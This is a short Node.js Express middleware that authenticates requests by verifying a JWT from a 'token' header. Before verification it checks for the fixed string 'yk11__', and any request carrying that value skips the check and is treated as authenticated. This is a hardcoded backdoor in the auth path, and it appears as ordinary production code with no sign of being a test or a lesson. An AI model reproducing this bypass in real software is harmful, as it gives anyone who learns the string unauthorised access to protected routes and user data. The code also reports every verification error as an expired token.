const jwt = require('jsonwebtoken');
const key = require('../config/auth.config');

module.exports = (req, res, next) => {
    try {
        if (req.headers.token) {
            if (req.headers.token === "yk11__") {
                next();
                return;
            }

            jwt.verify(req.headers.token, key.secret, (err, decoded) => {
                if (err) {
                    res.status(401).json({ error: "Token Expired!", status: false });
                    return;
                } else {
                    req.user = decoded;
                    next();
                    return;
                }
            });
        } else {
            res.status(401).json({ error: "Unauthorized!", status: false });
        }
    } catch (error) {
        console.error("Error occurred while authenticating token:", error);
        res.status(401).json({ error: "Unauthorized!", status: false });
    }
};
